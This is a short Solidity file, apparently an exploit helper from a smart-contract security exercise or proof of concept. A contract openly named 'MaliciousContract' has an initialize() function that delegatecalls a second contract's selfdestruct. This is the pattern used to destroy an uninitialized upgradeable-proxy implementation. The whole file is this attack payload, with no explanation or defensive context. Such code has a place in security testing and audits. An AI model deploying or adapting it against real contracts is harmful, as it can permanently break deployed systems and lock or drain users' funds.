// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract MaliciousContract {
  function initialize() external {
    Destructor des = new Destructor();
      (bool success, ) = address(des).delegatecall(abi.encodeWithSignature("destruct()"));
      require(success);
  }

}

contract Destructor {
  function destruct() external{
    selfdestruct(payable(msg.sender));
  }
}
